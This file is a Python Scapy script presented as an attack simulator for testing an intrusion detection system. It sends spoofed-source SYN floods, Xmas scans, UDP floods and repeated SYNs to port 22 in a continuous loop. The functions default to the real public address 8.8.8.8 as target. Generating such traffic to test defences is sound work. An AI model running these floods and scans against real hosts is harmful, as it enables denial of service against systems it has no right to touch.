import time
import argparse
import random
from scapy.all import *

def random_public_ip():
    """Generate a realistic random public IP address for GeoIP mapping."""
    while True:
        ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        # Skip private/reserved subnets roughly
        if ip.startswith(("10.", "192.168.", "127.", "169.254.", "172.")):
            continue
        return ip

def simulate_syn_flood(target="8.8.8.8", count=100, delay=0.01):
    print(f"🚀 Simulating SYN Flood (DoS) on {target}...")
    for i in range(count):
        spoofed_src = random_public_ip()
        pkt = IP(src=spoofed_src, dst=target)/TCP(sport=RandShort(), dport=80, flags="S")
        send(pkt, verbose=0)
        time.sleep(delay)

def simulate_xmas_scan(target="8.8.8.8", count=50, delay=0.02):
    print(f"🚀 Simulating Xmas Scan (PortScan) on {target}...")
    for i in range(count):
        spoofed_src = random_public_ip()
        # Xmas scan: FIN, PSH, and URG flags set
        pkt = IP(src=spoofed_src, dst=target)/TCP(sport=RandShort(), dport=RandShort(), flags="FPU")
        send(pkt, verbose=0)
        time.sleep(delay)

def simulate_udp_flood(target="8.8.8.8", count=100, delay=0.005):
    print(f"🚀 Simulating UDP Flood (DoS/DDoS) on {target}...")
    for i in range(count):
        spoofed_src = random_public_ip()
        pkt = IP(src=spoofed_src, dst=target)/UDP(sport=RandShort(), dport=RandShort())/Raw(load="X"*random.randint(64, 1024))
        send(pkt, verbose=0)
        time.sleep(delay)

def simulate_brute_force(target="8.8.8.8", count=30, delay=0.1):
    print(f"🚀 Simulating SSH Brute Force (Probe) on {target}...")
    for i in range(count):
        spoofed_src = random_public_ip()
        # Target SSH port 22 repeatedly
        pkt = IP(src=spoofed_src, dst=target)/TCP(sport=RandShort(), dport=22, flags="S")
        send(pkt, verbose=0)
        time.sleep(delay)

if __name__ == "__main__":
    import socket
    # Get local IP to ensure packets hit the local interface on Mac
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except:
        local_ip = "127.0.0.1"

    parser = argparse.ArgumentParser(description="AI-Powered IDS Attack Simulator")
    parser.add_argument("--target", type=str, default=local_ip, help="Target IP address")
    args = parser.parse_args()

    print("=========================================")
    print("      LIVE ATTACK SIMULATOR (IDS)        ")
    print("=========================================")
    print("🚀 Continuous Mode: Press Ctrl+C to stop")
    print("=========================================\n")

    try:
        while True:
            simulate_syn_flood(args.target)
            time.sleep(2)
            simulate_xmas_scan(args.target)
            time.sleep(2)
            simulate_udp_flood(args.target)
            time.sleep(2)
            simulate_brute_force(args.target)
            
            print("\n⏳ Cycle complete. Waiting 10 seconds before next wave...")
            time.sleep(10)
    except KeyboardInterrupt:
        print("\n✅ Simulation stopped by user.")
